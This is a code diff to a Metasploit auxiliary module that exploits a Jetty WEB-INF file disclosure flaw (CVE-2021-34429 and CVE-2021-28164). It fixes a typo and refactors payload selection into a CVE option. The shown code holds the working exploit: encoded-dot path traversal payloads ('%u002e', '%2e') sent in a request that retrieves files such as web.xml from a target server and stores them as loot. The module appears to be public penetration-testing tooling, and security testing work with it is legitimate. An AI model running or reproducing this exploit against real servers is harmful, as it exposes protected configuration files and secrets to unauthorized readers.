@@ -14,7 +14,7 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Jetty WEB-INF File Disclosure',
         'Description' => %q{
-          Jetty suffers from a vulneragbility where certain encoded URIs and ambiguous paths can access
+          Jetty suffers from a vulnerability where certain encoded URIs and ambiguous paths can access
           protected files in the WEB-INF folder. Versions effected are:
           9.4.37.v20210219, 9.4.38.v20210224 and 9.4.37-9.4.42, 10.0.1-10.0.5, 11.0.1-11.0.5.
           Exploitation can obtain any file in the WEB-INF folder, but web.xml is most likely
@@ -44,15 +44,15 @@ class MetasploitModule < Msf::Auxiliary
         },
         'DisclosureDate' => '2021-07-15',
         'Actions' => [
-          [ 'CVE-2021-34429', { 'Description' => 'Utilizes %u002e to get to WEB-INF' } ],
-          [ 'CVE-2021-28164', { 'Description' => 'Utilizes %2e to get to WEB-INF' } ]
+          [ 'READ_FILE', { 'Description' => 'Read file on the remote server from WEB-INF folder.' } ],
         ],
-        'DefaultAction' => 'CVE-2021-34429'
+        'DefaultAction' => 'READ_FILE'
       )
     )
     register_options([
       Opt::RPORT(80),
-      OptString.new('FILE', [false, 'File in WEB-INF to retrieve', 'web.xml'])
+      OptString.new('FILE', [false, 'File in WEB-INF to retrieve', 'web.xml']),
+      OptEnum.new('CVE', [true, 'The vulnerability to use', 'CVE-2021-34429', ['CVE-2021-34429', 'CVE-2021-28164']])
     ])
   end
 
@@ -80,12 +80,19 @@ class MetasploitModule < Msf::Auxiliary
     Exploit::CheckCode::Safe
   end
 
-  def run
-    bypass = '%2e'
-    if action.name == 'CVE-2021-34429'
-      bypass = '%u002e'
+  def pick_payload
+    case datastore['CVE']
+    when 'CVE-2021-34429'
+      payload = '%u002e'
+    when 'CVE-2021-28164'
+      payload = '%2e'
     end
-    res = send_request_cgi('uri' => "/#{bypass}/WEB-INF/#{datastore['FILE']}")
+
+    payload
+  end
+
+  def run
+    res = send_request_cgi('uri' => "/#{pick_payload}/WEB-INF/#{datastore['FILE']}")
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
     fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") unless res.code == 200
     path = store_loot("jetty.#{datastore['FILE']}", 'text/plain', target_host, res.body, datastore['FILE'], 'Jetty WEB-INF File')
